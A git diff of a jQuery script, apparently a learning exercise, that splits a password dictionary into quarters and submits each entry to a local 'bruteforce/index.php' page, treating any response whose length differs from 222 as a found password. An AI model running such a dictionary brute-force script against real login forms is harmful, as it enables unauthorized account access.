@@ -1,17 +1,20 @@
 var passwords = [];
 var password = '';
 var numberOfAttackFailed = 0;
-var quarter, firstQuarter, secondQuarter, thirdQuarter, fourthQuarter;
+var quarter, firstQuarter, secondQuarter, thirdQuarter, fourthQuarter, result = [];
+
+  // $.get('./dico.txt', function(data){passwords = data.split(/\n/);});
 
   $.ajax({
     type: 'GET',
-    dataType: 'text',
     async: false,
-    url: './dico.txt',
+    dataType: 'text',
+    url: '../data/dico.txt',
     success: function (data){
       passwords = data.split(/\n/);
     },
   });
+
 quarter = Math.floor(passwords.length / 4);
 firstQuarter = passwords.splice(0, quarter);
 secondQuarter = passwords.splice(0, quarter);
@@ -19,24 +22,29 @@ thirdQuarter = passwords.splice(0, quarter);
 fourthQuarter = passwords.splice(0, quarter);
 
 function ajaxAttack(array){
-  for ( var i = 0; i < array.length; i++){
-    password = array[i];
-    var data = {password: password};
+  array.forEach(function(value){
+
+
+    var data = {password: value};
     console.log('attacking!');
     $.ajax({
-      type: 'POST',
-      async: false,
-      url: 'localhost/bruteforce/index.php',
+      type: 'GET',
+      url: '../bruteforce/index.php',
       data: data,
-      success: function(){
-        console.log('Ca marche! le bon password est : '+ password +' !');
+      success: function(data){
+        if (data.length != 222){
+          console.log(value);
+          result.push(data);
+        }
       },
       error: function(){
-        // console.log('Ca ne marche pas. '+ password +' est un mauvais mot de passe!');
+        console.log('FAILED');
         numberOfAttackFailed++;
       }
     });
-  }
+
+  });
+
 }
 
 $('#first-quarter').on('click', function(){
